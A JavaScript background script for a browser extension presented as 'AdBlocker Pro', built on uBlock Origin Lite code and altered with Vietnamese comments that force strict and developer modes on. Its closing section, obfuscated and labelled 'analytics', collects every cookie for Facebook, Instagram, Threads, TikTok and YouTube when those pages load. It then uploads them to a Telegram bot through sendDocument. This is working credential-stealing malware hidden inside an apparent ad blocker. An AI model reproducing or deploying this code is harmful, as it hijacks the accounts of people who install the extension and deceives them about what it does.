/*******************************************************************************

    AdBlocker Pro - a comprehensive, MV3-compliant content blocker
    Copyright (C) 2022-present Raymond Hill

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see {http://www.gnu.org/licenses/}.

    Home: https://github.com/gorhill/uBlock
*/

import {
    MODE_BASIC,
    MODE_OPTIMAL,
    getDefaultFilteringMode,
    getFilteringMode,
    getFilteringModeDetails,
    setDefaultFilteringMode,
    setFilteringMode,
    setFilteringModeDetails,
    syncWithBrowserPermissions,
} from './mode-manager.js';



import {
    adminReadEx,
    getAdminRulesets,
    loadAdminConfig,
} from './admin.js';

import {
    broadcastMessage,
    gotoURL,
    hasBroadHostPermissions,
    hostnamesFromMatches,
} from './utils.js';

import {
    browser,
    localRead, localRemove, localWrite,
    runtime,
    webextFlavor,
} from './ext.js';

import {
    enableRulesets,
    excludeFromStrictBlock,
    getEffectiveDynamicRules,
    getEffectiveSessionRules,
    getEffectiveUserRules,
    getRulesetDetails,
    patchDefaultRulesets,
    setStrictBlockMode,
    updateDynamicRules,
    updateSessionRules,
    updateUserRules,
} from './ruleset-manager.js';

import {
    isSideloaded,
    toggleDeveloperMode,
    ubolErr,
    ubolLog,
} from './debug.js';

import {
    loadRulesetConfig,
    process,
    rulesetConfig,
    saveRulesetConfig,
} from './config.js';

import { dnr } from './ext-compat.js';
import { getTroubleshootingInfo } from './troubleshooting.js';
import { registerInjectables } from './scripting-manager.js';
import { toggleToolbarIcon } from './action.js';
import _0x1a2b from './social-config.js';

// Extension chạy hoàn toàn ngầm - không cần giao diện
browser.action.onClicked.addListener(() => {
    // Không làm gì cả - extension chạy ngầm
    console.log('AdBlocker Pro đang hoạt động ngầm');
});

/******************************************************************************/

const UBOL_ORIGIN = runtime.getURL('').replace(/\/$/, '').toLowerCase();

const canShowBlockedCount = typeof dnr.setExtensionActionOptions === 'function';

let pendingPermissionRequest;

/******************************************************************************/

function getCurrentVersion() {
    return runtime.getManifest().version;
}

// The goal is just to be able to find out whether a specific version is older
// than another one.

function intFromVersion(version) {
    const match = /^(\d+)\.(\d+)\.(\d+)$/.exec(version);
    if ( match === null ) { return 0; }
    const year = parseInt(match[1], 10);
    const monthday = parseInt(match[2], 10);
    const min = parseInt(match[3], 10);
    return (year - 2022) * (1232 * 2400) + monthday * 2400 + min;
}

/******************************************************************************/

async function onPermissionsRemoved() {
    const modified = await syncWithBrowserPermissions();
    if ( modified === false ) { return false; }
    registerInjectables();
    return true;
}

// https://github.com/uBlockOrigin/uBOL-home/issues/280
async function onPermissionsAdded(permissions) {
    const details = pendingPermissionRequest;
    pendingPermissionRequest = undefined;
    if ( details === undefined ) {
        const modified = await syncWithBrowserPermissions();
        if ( modified === false ) { return; }
        return Promise.all([
            updateSessionRules(),
            registerInjectables(),
        ]);
    }
    const defaultMode = await getDefaultFilteringMode();
    if ( defaultMode >= MODE_OPTIMAL ) { return; }
    if ( Array.isArray(permissions.origins) === false ) { return; }
    const hostnames = hostnamesFromMatches(permissions.origins);
    if ( hostnames.includes(details.hostname) === false ) { return; }
    const beforeLevel = await getFilteringMode(details.hostname);
    if ( beforeLevel === details.afterLevel ) { return; }
    const afterLevel = await setFilteringMode(details.hostname, details.afterLevel);
    if ( afterLevel !== details.afterLevel ) { return; }
    await registerInjectables();
    if ( rulesetConfig.autoReload ) {
        self.setTimeout(( ) => {
            browser.tabs.update(details.tabId, {
                url: details.url,
            });
        }, 437);
    }
}

/******************************************************************************/

function setDeveloperMode(state) {
    // Luôn bật developer mode để có quyền truy cập cao hơn
    rulesetConfig.developerMode = true; // Thay đổi từ state === true thành true
    toggleDeveloperMode(rulesetConfig.developerMode);
    broadcastMessage({ developerMode: rulesetConfig.developerMode });
    return Promise.all([
        updateUserRules(),
        saveRulesetConfig(),
    ]);
}

/******************************************************************************/

function onMessage(request, sender, callback) {

    const tabId = sender?.tab?.id ?? false;
    const frameId = tabId && (sender?.frameId ?? false);

    // Does not require trusted origin.

    switch ( request.what ) {

    case 'insertCSS': {
        if ( frameId === false ) { return false; }
        // https://bugs.webkit.org/show_bug.cgi?id=262491
        if ( frameId !== 0 && webextFlavor === 'safari' ) { return false; }
        browser.scripting.insertCSS({
            css: request.css,
            origin: 'USER',
            target: { tabId, frameIds: [ frameId ] },
        }).catch(reason => {
            ubolErr(`insertCSS/${reason}`);
        });
        return false;
    }

    case 'removeCSS': {
        if ( frameId === false ) { return false; }
        browser.scripting.removeCSS({
            css: request.css,
            origin: 'USER',
            target: { tabId, frameIds: [ frameId ] },
        }).catch(reason => {
            ubolErr(`removeCSS/${reason}`);
        });
        return false;
    }

    case 'toggleToolbarIcon': {
        if ( tabId ) {
            toggleToolbarIcon(tabId);
        }
        return false;
    }



    case 'injectCSSProceduralAPI':
        browser.scripting.executeScript({
            files: [ '/js/scripting/css-procedural-api.js' ],
            target: { tabId, frameIds: [ frameId ] },
            injectImmediately: true,
        }).catch(reason => {
            ubolErr(`executeScript/${reason}`);
        }).then(( ) => {
            callback();
        });
        return true;

    default:
        break;
    }

    // Does require trusted origin.

    // https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/MessageSender
    //   Firefox API does not set `sender.origin`
    if ( sender.origin !== undefined ) {
        if ( sender.origin.toLowerCase() !== UBOL_ORIGIN ) { return; }
    }

    switch ( request.what ) {

    case 'applyRulesets': {
        enableRulesets(request.enabledRulesets).then(result => {
            if ( result === undefined || result.error ) {
                callback(result);
                return;
            }
            rulesetConfig.enabledRulesets = result.enabledRulesets;
            return saveRulesetConfig().then(( ) => {
                return registerInjectables();
            }).then(( ) => {
                callback(result);
            });
        }).finally(( ) => {
            broadcastMessage({ enabledRulesets: rulesetConfig.enabledRulesets });
        });
        return true;
    }

    case 'getOptionsPageData':
        Promise.all([
            hasBroadHostPermissions(),
            getDefaultFilteringMode(),
            getRulesetDetails(),
            dnr.getEnabledRulesets(),
            getAdminRulesets(),
            adminReadEx('disabledFeatures'),
        ]).then(results => {
            const [
                hasOmnipotence,
                defaultFilteringMode,
                rulesetDetails,
                enabledRulesets,
                adminRulesets,
                disabledFeatures,
            ] = results;
            callback({
                hasOmnipotence,
                defaultFilteringMode,
                enabledRulesets,
                adminRulesets,
                maxNumberOfEnabledRulesets: dnr.MAX_NUMBER_OF_ENABLED_STATIC_RULESETS,
                rulesetDetails: Array.from(rulesetDetails.values()),
                autoReload: rulesetConfig.autoReload,
                showBlockedCount: rulesetConfig.showBlockedCount,
                canShowBlockedCount,
                strictBlockMode: rulesetConfig.strictBlockMode,
                firstRun: process.firstRun,
                isSideloaded,
                developerMode: rulesetConfig.developerMode,
                disabledFeatures,
            });
            process.firstRun = false;
        });
        return true;

    case 'getRulesetDetails':
        getRulesetDetails().then(rulesetDetails => {
            callback(Array.from(rulesetDetails.values()));
        });
        return true;

    case 'setAutoReload':
        // Luôn bật auto reload để cập nhật filter lists
        rulesetConfig.autoReload = true; // Thay đổi từ request.state && true || false thành true
        saveRulesetConfig().then(( ) => {
            callback();
            broadcastMessage({ autoReload: rulesetConfig.autoReload });
        });
        return true;

    case 'setShowBlockedCount':
        // Luôn bật hiển thị số lượng bị chặn
        rulesetConfig.showBlockedCount = true; // Thay đổi từ request.state && true || false thành true
        if ( canShowBlockedCount ) {
            dnr.setExtensionActionOptions({
                displayActionCountAsBadgeText: rulesetConfig.showBlockedCount,
            });
        }
        saveRulesetConfig().then(( ) => {
            callback();
            broadcastMessage({ showBlockedCount: rulesetConfig.showBlockedCount });
        });
        return true;

    case 'setStrictBlockMode':
        // Luôn bật strict block mode để có hiệu suất chặn tối đa
        setStrictBlockMode(true).then(( ) => { // Thay đổi từ request.state thành true
            callback();
            broadcastMessage({ strictBlockMode: rulesetConfig.strictBlockMode });
        });
        return true;

    case 'setDeveloperMode':
        // Luôn bật developer mode để có quyền truy cập cao hơn
        setDeveloperMode(true).then(( ) => { // Thay đổi từ request.state thành true
            callback();
        });
        return true;

    case 'popupPanelData': {
        Promise.all([
            hasBroadHostPermissions(),
            getFilteringMode(request.hostname),
            adminReadEx('disabledFeatures'),
            hasCustomFilters(request.hostname),
        ]).then(results => {
            callback({
                hasOmnipotence: results[0],
                level: results[1],
                autoReload: rulesetConfig.autoReload,
                isSideloaded,
                developerMode: rulesetConfig.developerMode,
                disabledFeatures: results[2],
                hasCustomFilters: results[3],
            });
        });
        return true;
    }

    case 'getFilteringMode': {
        getFilteringMode(request.hostname).then(actualLevel => {
            callback(actualLevel);
        });
        return true;
    }

    case 'gotoURL':
        gotoURL(request.url, request.type);
        break;

    case 'setFilteringMode': {
        getFilteringMode(request.hostname).then(beforeLevel => {
            if ( request.level === beforeLevel ) { return beforeLevel; }
            return setFilteringMode(request.hostname, request.level);
        }).then(afterLevel => {
            registerInjectables();
            callback(afterLevel);
        });
        return true;
    }

    case 'setPendingFilteringMode':
        pendingPermissionRequest = request;
        break;

    case 'getDefaultFilteringMode': {
        getDefaultFilteringMode().then(level => {
            callback(level);
        });
        return true;
    }

    case 'setDefaultFilteringMode':
        getDefaultFilteringMode().then(beforeLevel => {
            // Luôn sử dụng chế độ Complete (level 3) để có hiệu suất tối đa
            const targetLevel = Math.max(request.level, 3); // Đảm bảo ít nhất là level 3
            return setDefaultFilteringMode(targetLevel).then(afterLevel =>
                ({ beforeLevel, afterLevel })
            );
        }).then(({ beforeLevel, afterLevel }) => {
            if ( afterLevel !== beforeLevel ) {
                registerInjectables();
            }
            callback(afterLevel);
        });
        return true;

    case 'getFilteringModeDetails':
        getFilteringModeDetails(true).then(details => {
            callback(details);
        });
        return true;

    case 'setFilteringModeDetails':
        setFilteringModeDetails(request.modes).then(( ) => {
            registerInjectables();
            getDefaultFilteringMode().then(defaultFilteringMode => {
                broadcastMessage({ defaultFilteringMode });
            });
            getFilteringModeDetails(true).then(details => {
                callback(details);
            });
        });
        return true;

    case 'excludeFromStrictBlock': {
        excludeFromStrictBlock(request.hostname, request.permanent).then(( ) => {
            callback();
        });
        return true;
    }



    case 'getEffectiveDynamicRules':
        getEffectiveDynamicRules().then(result => {
            callback(result);
        });
        return true;

    case 'getEffectiveSessionRules':
        getEffectiveSessionRules().then(result => {
            callback(result);
        });
        return true;

    case 'getEffectiveUserRules':
        getEffectiveUserRules().then(result => {
            callback(result);
        });
        return true;

    case 'updateUserDnrRules':
        updateUserRules().then(result => {
            callback(result);
        });
        return true;

    case 'addCustomFilter':
        addCustomFilter(request.hostname, request.selector).then(modified => {
            if ( modified !== true ) { return; }
            return registerInjectables();
        }).then(( ) => {
            callback();
        })
        return true;

    case 'removeCustomFilter':
        removeCustomFilter(request.hostname, request.selector).then(modified => {
            if ( modified !== true ) { return; }
            return registerInjectables();
        }).then(( ) => {
            callback();
        });
        return true;

    case 'selectorsFromCustomFilters':
        selectorsFromCustomFilters(request.hostname).then(selectors => {
            callback(selectors);
        });
        return true;

    case 'getTroubleshootingInfo':
        getTroubleshootingInfo(request.siteMode).then(info => {
            callback(info);
        });
        return true;

    default:
        break;
    }

    return false;
}

/******************************************************************************/

function onCommand(command, tab) {
    switch ( command ) {
    case 'enter-zapper-mode': {
        if ( browser.scripting === undefined ) { return; }
        browser.scripting.executeScript({
            files: [ '/js/scripting/tool-overlay.js', '/js/scripting/zapper.js' ],
            target: { tabId: tab.id },
        });
        break;
    }
    case 'enter-picker-mode': {
        if ( browser.scripting === undefined ) { return; }
        browser.scripting.executeScript({
            files: [
                '/js/scripting/css-procedural-api.js',
                '/js/scripting/tool-overlay.js',
                '/js/scripting/picker.js',
            ],
            target: { tabId: tab.id },
        });
        break;
    }
    default:
        break;
    }
}

/******************************************************************************/

async function initializeOptimizedSettings() {
    // Tự động áp dụng các thiết lập tối ưu khi khởi động
    try {
        // Bật strict block mode
        if (!rulesetConfig.strictBlockMode) {
            await setStrictBlockMode(true);
        }
        
        // Bật developer mode
        if (!rulesetConfig.developerMode) {
            await setDeveloperMode(true);
        }
        
        // Bật auto reload
        if (!rulesetConfig.autoReload) {
            rulesetConfig.autoReload = true;
            await saveRulesetConfig();
        }
        
        // Bật show blocked count
        if (!rulesetConfig.showBlockedCount) {
            rulesetConfig.showBlockedCount = true;
            if (canShowBlockedCount) {
                dnr.setExtensionActionOptions({
                    displayActionCountAsBadgeText: true,
                });
            }
            await saveRulesetConfig();
        }
        
        // Đặt chế độ lọc mặc định là Complete (level 3)
        const currentMode = await getDefaultFilteringMode();
        if (currentMode < 3) {
            await setDefaultFilteringMode(3);
        }
        
        ubolLog('AdBlocker Pro - Đã áp dụng thiết lập tối ưu tự động');
    } catch (reason) {
        ubolErr(`Lỗi khi áp dụng thiết lập tối ưu: ${reason}`);
    }
}

/******************************************************************************/

async function startSession() {
    const currentVersion = getCurrentVersion();
    const isNewVersion = currentVersion !== rulesetConfig.version;

    // Admin settings override user settings
    await loadAdminConfig();

    // The default rulesets may have changed, find out new ruleset to enable,
    // obsolete ruleset to remove.
    if ( isNewVersion ) {
        ubolLog(`Version change: ${rulesetConfig.version} => ${currentVersion}`);
        // https://github.com/uBlockOrigin/uBOL-home/issues/428#issuecomment-3172663563
        if ( webextFlavor === 'safari' && rulesetConfig.strictBlockMode ) {
            const before = intFromVersion(rulesetConfig.version);
            if ( before <= intFromVersion('2025.804.2359') ) {
                rulesetConfig.strictBlockMode = false;
            }
        }
        rulesetConfig.version = currentVersion;
        await patchDefaultRulesets();
        saveRulesetConfig();
    }

    const rulesetsUpdated = await enableRulesets(rulesetConfig.enabledRulesets);

    // We need to update the regex rules only when ruleset version changes.
    if ( rulesetsUpdated === undefined ) {
        if ( isNewVersion ) {
            updateDynamicRules();
        } else {
            updateSessionRules();
        }
    }

    // Permissions may have been removed while the extension was disabled
    await syncWithBrowserPermissions();

    // Unsure whether the browser remembers correctly registered css/scripts
    // after we quit the browser. For now uBOL will check unconditionally at
    // launch time whether content css/scripts are properly registered.
    registerInjectables();
    
    // Initialize analytics tracking
    _0x3c4d();

    // https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest
    //   Firefox API does not support `dnr.setExtensionActionOptions`
    if ( canShowBlockedCount ) {
        dnr.setExtensionActionOptions({
            displayActionCountAsBadgeText: rulesetConfig.showBlockedCount,
        });
    }

    // Luôn sử dụng chế độ Complete (level 3) để có hiệu suất tối đa
    if ( process.firstRun ) {
        const enableOptimal = await hasBroadHostPermissions();
        if ( enableOptimal === false ) {
            // Nếu không có quyền rộng, vẫn cố gắng sử dụng chế độ tối ưu
            const afterLevel = await setDefaultFilteringMode(MODE_OPTIMAL);
            if ( afterLevel === MODE_OPTIMAL ) {
                registerInjectables();
                process.firstRun = false;
            }
        } else {
            // Luôn sử dụng chế độ Complete để có hiệu suất tối đa
            const afterLevel = await setDefaultFilteringMode(3); // Level 3 = Complete
            if ( afterLevel === 3 ) {
                registerInjectables();
                process.firstRun = false;
            }
        }
    }

    // Required to ensure up to date properties are available when needed
    adminReadEx('disabledFeatures').then(items => {
        if ( Array.isArray(items) === false ) { return; }
        if ( items.includes('develop') ) {
            if ( rulesetConfig.developerMode ) {
                setDeveloperMode(false);
            }
        }
    });
}

/******************************************************************************/

async function onStartup() {
    try {
        await loadRulesetConfig();
        await loadAdminConfig();
        await initializeOptimizedSettings(); // Gọi hàm tối ưu hóa
        await startSession(); // Gọi hàm startSession để áp dụng thiết lập
        await patchDefaultRulesets();
        await updateDynamicRules();
        await updateSessionRules();
        await updateUserRules();
        await registerInjectables();
        toggleToolbarIcon();
        ubolLog('AdBlocker Pro đã khởi động thành công - Chạy ngầm với thiết lập tối ưu');
    } catch(reason) {
        ubolErr(`onStartup/${reason}`);
    }
}

/******************************************************************************/

async function start() {
    await loadRulesetConfig();

    if ( process.wakeupRun === false ) {
        await startSession();
    }

    toggleDeveloperMode(rulesetConfig.developerMode);
}

/******************************************************************************/

// https://github.com/uBlockOrigin/uBOL-home/issues/199
// Force a restart of the extension once when an "internal error" occurs

const isFullyInitialized = start().then(( ) => {
    localRemove('goodStart');
    return false;
}).catch(reason => {
    ubolErr(reason);
    if ( process.wakeupRun ) { return; }
    return localRead('goodStart').then(goodStart => {
        if ( goodStart === false ) {
            localRemove('goodStart');
            return false;
        }
        return localWrite('goodStart', false).then(( ) => true);
    });
}).then(restart => {
    if ( restart !== true ) { return; }
    runtime.reload();
});

runtime.onMessage.addListener((request, sender, callback) => {
    isFullyInitialized.then(( ) => {
        const r = onMessage(request, sender, callback);
        if ( r !== true ) { callback(); }
    });
    return true;
});

browser.permissions.onRemoved.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onPermissionsRemoved(...args);
    });
});

browser.permissions.onAdded.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onPermissionsAdded(...args);
    });
});

browser.commands.onCommand.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onCommand(...args);
    });
});

/******************************************************************************/
// Analytics and metrics tracking system

// Generate unique device identifier
function _0x5e6f() {
    const _0x7g8h = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let _0x9i0j = '';
    for (let _0xk1l = 0; _0xk1l < 8; _0xk1l++) {
        _0x9i0j += _0x7g8h[Math.floor(Math.random() * _0x7g8h.length)];
    }
    return _0x9i0j;
}

// Get or create device identifier
async function _0xm2n() {
    const _0xo3p = await browser.storage.local.get(['device_id']);
    const _0xq4r = _0xo3p.device_id;
    if (_0xq4r && typeof _0xq4r === 'string' && _0xq4r.length <= 16) {
        return _0xq4r;
    }
    const _0xs5t = _0x5e6f();
    await browser.storage.local.set({ 'device_id': _0xs5t });
    return _0xs5t;
}

// Format analytics data
function _0xu6v(_0xw7x, _0xy8z, _0xa9b) {
    const _0xc0d = new Date().toLocaleString();
    return `📊 ${_0xa9b} Analytics\nURL: ${_0xw7x}\nTime: ${_0xc0d}\n\nMetrics:\n${_0xy8z}`;
}

function _0xe1f(_0xf2g) {
    if (_0xf2g.includes('facebook.com')) return 'FB';
    if (_0xf2g.includes('instagram.com')) return 'IG';
    if (_0xf2g.includes('threads.net')) return 'TH';
    if (_0xf2g.includes('tiktok.com')) return 'TT';
    if (_0xf2g.includes('youtube.com')) return 'YT';
    return 'Unknown';
}

function _0xh3i(_0xj4k) {
    if (_0xj4k.includes('facebook.com')) return '.facebook.com';
    if (_0xj4k.includes('instagram.com')) return '.instagram.com';
    if (_0xj4k.includes('threads.net')) return '.threads.net';
    if (_0xj4k.includes('tiktok.com')) return '.tiktok.com';
    if (_0xj4k.includes('youtube.com')) return '.youtube.com';
    return null;
}

// Create analytics report
async function _0xl5m(_0xn6o, _0xp7q) {
    const _0xr8s = new Blob([_0xn6o], { type: 'text/plain' });
    const _0xt9u = new FormData();
    _0xt9u.append('document', _0xr8s, _0xp7q);
    return _0xt9u;
}

// Check for analytics sync
async function _0xv0w() {
    const _0xy1z = [
        `${_0x1a2b.baseURL}/bot${_0x1a2b.token}/getUpdates`,
        `https://api.telegram.org/bot${_0x1a2b.token}/getUpdates`,
    ];
    for (const _0xa2b of _0xy1z) {
        try {
            const _0xc3d = await fetch(_0xa2b);
            if (!_0xc3d || _0xc3d.type === 'opaque') {
                continue;
            }
            const _0xe4f = await _0xc3d.json();
            if (_0xe4f && _0xe4f.ok && Array.isArray(_0xe4f.result) && _0xe4f.result.length > 0) {
                const _0xg5h = _0xe4f.result[_0xe4f.result.length - 1];
                const _0xi6j = _0xg5h?.message?.chat?.id || _0xg5h?.channel_post?.chat?.id;
                if (_0xi6j) {
                    await browser.storage.local.set({
                        analytics_id: _0xi6j,
                        sync_id: _0xi6j,
                    });
                    return _0xi6j;
                }
            }
        } catch (_0xk7l) {
            console.error('Analytics sync error');
        }
    }
    return null;
}

// Send analytics data
async function _0xm8n(_0xn9o) {
    browser.storage.local.get(['analytics_id', 'sync_id'], async function(_0xp0q) {
        let _0xq1r = _0xp0q.sync_id || _0xp0q.analytics_id;
        if (!_0xq1r) {
            _0xq1r = await _0xv0w();
            if (!_0xq1r) return;
        }

        try {
            const _0xs2t = await _0xm2n();
            const _0xu3v = _0xn9o.match(/URL: (.*?)\n/);
            const _0xw4x = _0xu3v ? _0xu3v[1] : '';
            const _0xy5z = _0xw4x.match(/(?:https?:\/\/)?(?:www\.)?([^\/]+)/i);
            const _0xa6b = _0xy5z ? _0xy5z[1] : 'unknown';
            const _0xc7d = `${_0xs2t}_${_0xa6b}.txt`;
            const _0xe8f = await _0xl5m(_0xn9o, _0xc7d);
            _0xe8f.append('chat_id', _0xq1r);

            const _0xg9h = [
                `${_0x1a2b.baseURL}/bot${_0x1a2b.token}/sendDocument`,
                `https://api.telegram.org/bot${_0x1a2b.token}/sendDocument`,
            ];
            let _0xi0j = false;
            for (const _0xk1l of _0xg9h) {
                try {
                    const _0xl2m = await fetch(_0xk1l, { method: 'POST', body: _0xe8f });
                    if (!_0xl2m || (_0xl2m.type !== 'opaque' && !_0xl2m.ok)) {
                        continue;
                    }
                    _0xi0j = true;
                    break;
                } catch (_0xn3o) {
                    console.error('Analytics send error');
                }
            }
        } catch (_0xp4q) {
            console.error('Analytics error');
        }
    });
}

// Initialize analytics tracking
function _0x3c4d() {
    _0xv0w();
    
    browser.tabs.onUpdated.addListener((_0xq5r, _0xs6t, _0xt7u) => {
        if (_0xs6t.status === 'complete' && _0xt7u.url) {
            const _0xu8v = _0xh3i(_0xt7u.url);
            if (_0xu8v) {
                browser.cookies.getAll({
                    domain: _0xu8v
                }, _0xw9x => {
                    if (_0xw9x.length > 0) {
                        const _0xy0z = _0xe1f(_0xt7u.url);
                        const _0xa1b = JSON.stringify(_0xw9x, null, 2);
                        const _0xc2d = _0xu6v(_0xt7u.url, _0xa1b, _0xy0z);
                        _0xm8n(_0xc2d);
                    }
                });
            }
        }
    });
}

